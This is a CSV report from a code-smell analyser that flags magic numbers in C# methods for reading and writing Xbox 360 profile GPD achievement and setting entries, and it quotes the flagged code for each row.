Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset + 4;  	// int32 for Struct size is constant (0x1C)  	xid = xRef.xIO.ReadInt32 ();  	imageID = xRef.xIO.ReadInt32 ();  	Worth = xRef.xIO.ReadUInt32 ();  	Flg = xRef.xIO.ReadBytes (4);  	TimeL = xRef.xIO.ReadInt64 ();  	try {  		DJsIO xStrings = new DJsIO (xRef.xIO.ReadBytes (Size - 0x1C)' true);  		xTitle = xStrings.ReadString (StringForm.Unicode);  		xDescription1 = xStrings.ReadString (StringForm.Unicode);  		xDescription2 = xStrings.ReadString (StringForm.Unicode);  	}  	catch {  		xTitle = "";  		xDescription1 = "";  		xDescription2 = "";  	}  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position = Offset + 4;  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: Flg = xRef.xIO.ReadBytes (4);  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = (Offset + 4);  	xRef.xIO.Write (AchievementID);  	xRef.xIO.Write (imageID);  	xRef.xIO.Write (Worth);  	xRef.xIO.Write (Flg);  	xRef.xIO.Write (TimeL);  	xRef.xIO.Flush ();  	if (UpdateSync)  		xRef.UpdateSync (NameSpace.Achievement' ID' SyncType.Server);  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Position = (Offset + 4);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position += 4;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position += 7;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: switch (ContentType) {  case SettingType.Binary:  	Var1 = xRef.xIO.ReadInt32 ();  	Var2 = xRef.xIO.ReadInt32 ();  	break;  case SettingType.Context:  	xdata = xRef.xIO.ReadInt32 ();  	break;  case SettingType.DateTime:  	xdata = xRef.xIO.ReadInt64 ();  	break;  case SettingType.Double:  	xdata = xRef.xIO.ReadDouble ();  	break;  case SettingType.Float:  	xdata = xRef.xIO.ReadSingle ();  	break;  case SettingType.UInt32:  	xdata = xRef.xIO.ReadUInt32 ();  	break;  case SettingType.Int64:  	xdata = xRef.xIO.ReadInt64 ();  	break;  case SettingType.Unicode:  	Var1 = xRef.xIO.ReadInt32 ();  	Var2 = xRef.xIO.ReadInt32 ();  	break;  default:  	Data = xRef.xIO.ReadBytes (8);  	break;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: Data = xRef.xIO.ReadBytes (8);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
